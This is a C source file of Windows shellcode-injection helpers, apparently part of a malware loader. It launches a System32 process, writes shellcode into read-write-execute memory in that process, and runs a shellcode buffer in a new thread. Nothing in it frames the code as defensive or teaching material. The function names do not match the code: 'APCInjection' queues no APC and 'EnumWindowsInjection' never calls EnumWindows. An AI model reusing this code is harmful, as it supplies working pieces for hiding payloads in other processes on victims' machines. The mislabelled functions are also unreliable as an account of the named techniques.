#include <windows.h>
#include <stdio.h>

// ==================================================================
// Original APC injection functions (using direct Win32 APIs)
// ==================================================================
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    Si.cb = sizeof(Si);
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) return FALSE;
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) return FALSE;
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    return TRUE;
}

BOOL APCInjection(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!*ppAddress) return FALSE;
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, NULL)) return FALSE;
    return TRUE;
}

// ==================================================================
// New EnumWindows injection (for USE_ENUMWINDOWS)
// ==================================================================
BOOL EnumWindowsInjection(PBYTE pShellcode, SIZE_T sSize) {
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return TRUE;
    }
    return FALSE;
}
